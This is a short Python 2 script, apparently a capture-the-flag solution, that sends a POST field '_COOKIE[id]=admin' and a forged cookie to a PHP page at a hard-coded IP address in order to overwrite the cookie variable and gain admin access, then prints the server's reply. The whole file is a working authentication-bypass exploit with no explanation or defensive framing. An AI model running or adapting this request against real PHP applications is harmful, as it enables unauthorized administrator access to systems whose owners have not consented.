import urllib2
import urllib
url = "http://112.166.114.186//index.php"
flag = ""
data = {"_COOKIE[id]":"admin"}
request = urllib2.Request(url, urllib.urlencode(data))
request.add_header('cookie',"id=admin?")
response = urllib2.urlopen(request)
k = response.read()
print k
